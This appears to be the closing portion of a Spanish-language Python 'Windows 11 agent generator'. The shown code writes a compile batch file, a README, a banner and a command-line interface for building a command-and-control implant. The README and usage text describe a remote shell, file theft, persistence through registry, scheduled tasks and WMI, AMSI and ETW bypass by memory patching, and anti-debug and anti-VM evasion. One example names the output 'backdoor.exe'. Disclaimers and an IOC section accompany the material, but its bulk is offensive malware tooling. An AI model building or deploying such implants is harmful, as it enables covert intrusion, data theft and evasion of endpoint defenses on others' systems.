set COMPILE_CMD="%CSC_PATH%" /target:winexe /out:{output_file} /reference:Microsoft.Win32.Registry.dll /reference:System.Management.dll /optimize+ /unsafe /nowarn:CS0168,CS0219 {cs_file}

echo Comando: %COMPILE_CMD%
echo.

REM Ejecutar compilación
%COMPILE_CMD%

if %ERRORLEVEL% equ 0 (
    echo.
    echo ╔══════════════════════════════════════════════════════════════════╗
    echo ║                    COMPILACIÓN EXITOSA                          ║
    echo ╚══════════════════════════════════════════════════════════════════╝
    echo.
    
    for %%F in ({output_file}) do (
        set SIZE=%%~zF
    )
    
    echo [+] Archivo generado: {output_file}
    echo [+] Tamaño: %SIZE% bytes
    echo.
    
    echo [*] MODO DE USO:
    echo     {output_file}              - Ejecutar agente
    echo     {output_file} --install    - Instalar persistencia
    echo.
    
    echo [*] COMANDOS DISPONIBLES:
    echo     shell <comando>          - Ejecutar comando CMD/PowerShell
    echo     download <archivo>       - Descargar archivo
    echo     persistence              - Instalar persistencia
    echo     exit                     - Terminar agente
    echo.
    
    echo [!] ADVERTENCIA LEGAL:
    echo     Este software es para investigación autorizada únicamente.
    echo     El uso no autorizado es ilegal y puede resultar en:
    echo     • Procesamiento penal
    echo     • Sanciones civiles
    echo     • Daño a la reputación
    echo.
    
    REM Mostrar hash del ejecutable
    echo [*] Verificación de integridad:
    certutil -hashfile {output_file} SHA256
    
) else (
    echo.
    echo ╔══════════════════════════════════════════════════════════════════╗
    echo ║                    ERROR EN LA COMPILACIÓN                       ║
    echo ╚══════════════════════════════════════════════════════════════════╝
    echo.
    
    echo [!] Posibles soluciones:
    echo     1. Verificar que .NET Framework 4.8+ esté instalado
    echo     2. Instalar Microsoft Build Tools
    echo     3. Verificar sintaxis del archivo .cs
    echo     4. Asegurar permisos de escritura
    echo.
)

echo.
pause
'''
        
        script_file = "compile_agent.bat"
        with open(script_file, 'w', encoding='utf-8') as f:
            f.write(script)
        
        print(f"[+] Script de compilación generado: {script_file}")
    
    def _generate_readme(self, c2_server, c2_port, output_file, features):
        """Generar archivo README con instrucciones"""
        
        features_list = "\n".join([f"- {self.features[feat]}" for feat in features])
        
        readme = f'''NEXUS AGENT GENERATOR - WINDOWS 11
============================================

FECHA DE GENERACIÓN: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
VERSIÓN: {self.version}
AUTOR: {self.author}

CONFIGURACIÓN
-------------
• Servidor C2: {c2_server}
• Puerto C2: {c2_port}
• Archivo de salida: {output_file}

CARACTERÍSTICAS INCLUIDAS
-------------------------
{features_list}

COMPILACIÓN
-----------
1. Copiar los siguientes archivos a Windows 11:
   - agent.cs (código fuente)
   - compile_agent.bat (script de compilación)

2. Ejecutar como administrador:
   > compile_agent.bat

3. Si hay errores, verificar:
   • .NET Framework 4.8+ instalado
   • Permisos de administrador
   • Espacio en disco suficiente

EJECUCIÓN
---------
MODO NORMAL:
  {output_file}

CON PERSISTENCIA:
  {output_file} --install

COMANDOS C2 DISPONIBLES
-----------------------
• shell <command>    - Ejecutar comando en el sistema
• download <file>    - Descargar archivo desde el objetivo
• persistence        - Instalar métodos de persistencia
• exit              - Terminar agente

TÉCNICAS DE EVASIÓN IMPLEMENTADAS
---------------------------------
1. AMSI Bypass:
   - Memory patching de AmsiScanBuffer
   - Reflection para deshabilitar AMSI

2. ETW Bypass:
   - NtSetInformationProcess
   - Patch de EtwEventWrite

3. Persistencia:
   - Registry Run keys
   - Scheduled Tasks
   - Startup folder
   - WMI Event Subscriptions (admin)

4. Anti-Detección:
   - Anti-debugging (IsDebuggerPresent, timing checks)
   - Anti-VM/Sandbox (procesos, RAM, registry)
   - Ofuscación de strings y datos

DETECCIÓN DEFENSIVA (Blue Team)
--------------------------------
Indicadores de Compromiso (IOCs):

1. Network:
   - Conexiones a {c2_server}:{c2_port}
   - Beaconing cada 30 segundos
   - Tráfico JSON con campos específicos

2. System:
   - Registry keys con nombres aleatorios
   - Scheduled tasks con nombres de Microsoft
   - Proceso sin ventana visible
   - AMSI/ETW deshabilitados

3. Process:
   - Nombre aleatorio del ejecutable
   - Comunicación TCP en segundo plano
   - Threads separados para beaconing

MITIGACIONES RECOMENDADAS
-------------------------
1. Network Security:
   - SSL/TLS inspection
   - IDS/IPS con firmas de C2
   - Egress filtering
   - Network segmentation

2. Endpoint Protection:
   - EDR con behavioral analysis
   - AMSI habilitado y monitoreado
   - PowerShell logging completo
   - Application whitelisting

3. Monitoring:
   - Sysmon con configuración avanzada
   - Windows Event Log centralizado
   - Monitorización de Scheduled Tasks
   - Detección de procesos sin ventana

LEGALIDAD Y ÉTICA
-----------------
ESTE SOFTWARE ES EXCLUSIVAMENTE PARA:
• Investigación de seguridad autorizada
• Pruebas de penetración con permiso escrito
• Laboratorios CTF controlados
• Auditorías de seguridad

USO NO AUTORIZADO ES ILEGAL Y PUEDE RESULTAR EN:
• Procesamiento penal según leyes locales
• Sanciones civiles y multas
• Pérdida de certificaciones profesionales
• Daño irreparable a la reputación

CONTACTO
--------
Para preguntas sobre investigación de seguridad:
research@security-lab.edu

¡USO RESPONSABLE Y ÉTICO!
'''
        
        readme_file = "README_AGENT.txt"
        with open(readme_file, 'w', encoding='utf-8') as f:
            f.write(readme)
        
        print(f"[+] Documentación generada: {readme_file}")
    
    def _generate_session_id(self):
        """Generar ID de sesión único"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(16))
    
    def _generate_agent_id(self):
        """Generar ID de agente único"""
        return f"AGENT_{random.randint(10000, 99999)}_{int(datetime.now().timestamp())}"
    
    def _generate_random_var_name(self, length=12, prefix=""):
        """Generar nombre de variable aleatorio"""
        if prefix:
            base = prefix + "_"
        else:
            base = ""
        
        chars = string.ascii_letters
        random_part = ''.join(random.choice(chars) for _ in range(length))
        
        return base + random_part
    
    def display_banner(self):
        """Mostrar banner del generador"""
        
        banner = f'''
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗  ██████╗ ████████╗   ║
║    ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██╔═══██╗╚══██╔══╝   ║
║    ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ██║      ║
║    ██║██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██║      ║
║    ██║██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝   ██║      ║
║    ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝      ║
║                                                                              ║
║                   WINDOWS 11 AGENT GENERATOR v{self.version}                  ║
║                    For Authorized Security Research Only                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

⚠️  LEGAL DISCLAIMER: This tool is EXCLUSIVELY for authorized security research,
    penetration testing with written permission, and controlled CTF environments.
    NEVER use on systems without explicit authorization.
    
'''
        print(banner)

def main():
    """Función principal"""
    
    parser = argparse.ArgumentParser(
        description='Generador de agentes Windows 11 con técnicas de evasión avanzadas',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Ejemplos de uso:
  %(prog)s --c2-server 192.168.1.100 --c2-port 8443
  %(prog)s --c2-server example.com --c2-port 443 --features amsi etw persistence
  %(prog)s --c2-server 10.0.0.5 --c2-port 8080 --output backdoor.exe --mode debug
  
Características disponibles:
  amsi        - AMSI bypass completo
  etw         - ETW bypass
  persistence - Persistencia avanzada
  obfuscation - Ofuscación real-time
  antidebug   - Anti-debugging techniques
  antivm      - Anti-VM/Sandbox detection
  smart_screen- SmartScreen bypass
  polymorphic - Comunicación polimórfica
        '''
    )
    
    parser.add_argument('--c2-server', required=True,
                       help='IP o dominio del servidor C2')
    parser.add_argument('--c2-port', type=int, default=8443,
                       help='Puerto del servidor C2 (default: 8443)')
    parser.add_argument('--output', default='agent.exe',
                       help='Nombre del archivo de salida (default: agent.exe)')
    parser.add_argument('--features', nargs='+',
                       default=['amsi', 'etw', 'persistence', 'antidebug'],
                       help='Características a incluir en el agente')
    parser.add_argument('--mode', choices=['debug', 'release'], default='release',
                       help='Modo de compilación (default: release)')
    
    args = parser.parse_args()
    
    # Validar puerto
    if not (1 <= args.c2_port <= 65535):
        print("[-] Puerto inválido. Debe estar entre 1 y 65535")
        return
    
    # Inicializar generador
    generator = WindowsAgentGenerator()
    generator.display_banner()
    
    # Generar agente
    try:
        cs_file = generator.generate_agent(
            c2_server=args.c2_server,
            c2_port=args.c2_port,
            output_file=args.output,
            features=args.features,
            compilation_mode=args.mode
        )
        
        if cs_file:
            print(f"\n{'='*80}")
            print("✅ GENERACIÓN COMPLETADA EXITOSAMENTE")
            print('='*80)
            print(f"\nArchivos generados:")
            print(f"  1. {cs_file}          - Código fuente C#")
            print(f"  2. compile_agent.bat  - Script de compilación para Windows")
            print(f"  3. README_AGENT.txt   - Documentación completa")
            
            print(f"\n📋 INSTRUCCIONES PARA COMPILAR EN WINDOWS 11:")
            print(f"  1. Copia los archivos a Windows 11")
            print(f"  2. Ejecuta como administrador: compile_agent.bat")
            print(f"  3. El ejecutable {args.output} será generado")
            
            print(f"\n⚠️  RECORDATORIO LEGAL:")
            print(f"  Este software es EXCLUSIVAMENTE para investigación autorizada.")
            print(f"  El uso no autorizado es ILEGAL y tiene consecuencias severas.")
            print(f"\n{'='*80}")
            
    except Exception as e:
        print(f"\n[!] Error durante la generación: {e}")
        print("    Verifica los parámetros e intenta nuevamente.")

if __name__ == "__main__":
    main()
